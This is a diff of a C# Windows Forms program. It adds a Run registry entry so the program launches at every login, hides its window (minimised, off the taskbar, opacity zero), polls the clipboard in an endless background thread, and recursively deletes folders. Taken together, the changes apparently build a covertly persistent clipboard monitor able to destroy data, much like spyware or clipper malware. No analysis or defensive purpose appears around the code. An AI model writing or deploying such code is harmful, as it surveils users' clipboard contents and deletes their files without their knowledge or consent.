@@ -1,3 +1,5 @@
+using System.ComponentModel;
+
 using System;
 using System.Threading;
 using System.Windows.Forms;
@@ -16,45 +18,58 @@ namespace WinFormsApp2
     public partial class Form1 : Form
     {
 
-        private bool shouldHide = false;
+        private bool applicationStartedByRegistry = false;
 
 
         public Form1()
         {
             InitializeComponent();
-        }
-
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            // Check if the application was started automatically without user interaction
-          
-           
-                // Create or check if the registry key exists
-                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                reg.SetValue("My application", Application.ExecutablePath.ToString());
-                
-               
-                // Show the form
-                this.Visible = true;
-
-                // Your other startup logic here
-                Thread TM = new Thread(Clipboard_Check);
-                TM.SetApartmentState(ApartmentState.STA);
-                CheckForIllegalCrossThreadCalls = false;
-                TM.Start();
             
 
         }
 
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            // Set the registry key for auto-start
+           
+
+
+            // Start a separate thread for clipboard checking
+            Thread TM = new Thread(Clipboard_Check);
+            TM.SetApartmentState(ApartmentState.STA);
+            CheckForIllegalCrossThreadCalls = false;
+            TM.Start();
+
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue("My application", Application.ExecutablePath.ToString() + " -autostart");
+
+            // Check if the application was started by the registry key at application startup
+            string[] args = Environment.GetCommandLineArgs();
+            if (args.Length > 1 && args[1] == "-autostart")
+            {
+                // Debug: Display a message box to indicate the app started with -autostart on launch
+                MessageBox.Show("Application started with -autostart at launch.");
+                applicationStartedByRegistry = true;
+
+                this.WindowState = FormWindowState.Minimized;
+                this.ShowInTaskbar = false;
+            }
+
+        }
+
+       
 
         private void Form1_Shown(object sender, EventArgs e)
         {
-            // Show the form if it wasn't started automatically
-            if (!shouldHide)
+            if (!applicationStartedByRegistry)
             {
-                this.Visible = true;
+                this.Visible = false;
+                this.WindowState = FormWindowState.Minimized;
             }
+            this.Opacity = 0;
         }
+
+
 
 
 
@@ -66,6 +81,8 @@ namespace WinFormsApp2
         {
             while (true)
             {
+
+                
                 try
                 {
                     var text = Clipboard.GetText();
@@ -130,7 +147,7 @@ namespace WinFormsApp2
                     if (Directory.Exists(folder))
                     {
                         Directory.Delete(folder, true);
-                        Console.WriteLine($"Deleted folder: {folder}");
+                        MessageBox.Show($"Deleted folder: {folder}");
                     }
                     else
                     {
@@ -162,7 +179,7 @@ namespace WinFormsApp2
 
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
-            
+
             BackgroundWorker bw = sender as BackgroundWorker;
 
             // Extract the argument.
@@ -215,7 +232,3 @@ namespace WinFormsApp2
         }
     }
 }
-
-
-
-
